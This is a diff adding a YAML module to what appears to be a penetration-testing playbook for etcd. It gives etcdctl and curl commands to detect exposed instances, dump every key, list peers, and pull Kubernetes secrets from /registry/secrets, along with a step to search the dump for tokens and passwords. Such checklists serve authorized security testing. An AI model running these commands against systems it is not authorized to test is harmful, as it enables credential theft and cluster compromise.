@@ -1,0 +1,55 @@
+module: etcd
+name: etcd (2379 / 2380)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version (unauth check)
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          curl -s http://$IP:$PORT/version
+          curl -sk https://$IP:$PORT/version
+
+  - id: enum
+    name: Key/Value Enumeration
+    steps:
+      - id: v3_getall
+        text: Dump all keys (API v3)
+        commands: |
+          ETCDCTL_API=3 etcdctl --endpoints=http://$IP:$PORT get "" --prefix --keys-only
+          ETCDCTL_API=3 etcdctl --endpoints=http://$IP:$PORT get "" --prefix
+      - id: v2_getall
+        text: Dump all keys (API v2, older)
+        commands: |
+          curl -s "http://$IP:$PORT/v2/keys/?recursive=true"
+      - id: members
+        text: Cluster membership / peers
+        commands: |
+          ETCDCTL_API=3 etcdctl --endpoints=http://$IP:$PORT member list
+
+  - id: loot
+    name: Secret Extraction
+    steps:
+      - id: k8s_secrets
+        text: Extract Kubernetes secrets (etcd backs the API server)
+        commands: |
+          ETCDCTL_API=3 etcdctl --endpoints=http://$IP:$PORT get /registry/secrets --prefix -w fields
+          ETCDCTL_API=3 etcdctl --endpoints=http://$IP:$PORT get /registry/ --prefix --keys-only
+      - id: creds
+        text: Hunt credentials / tokens / configs in values
+        manual: true
+        commands: |
+          # grep dumped values for password, token, apikey, service-account JWTs
+
+  - id: creds
+    name: Authentication (TLS / RBAC)
+    steps:
+      - id: tls
+        text: Authenticated access with client certs
+        tls_only: true
+        commands: |
+          ETCDCTL_API=3 etcdctl --endpoints=https://$IP:$PORT --cacert=ca.crt --cert=client.crt --key=client.key get "" --prefix
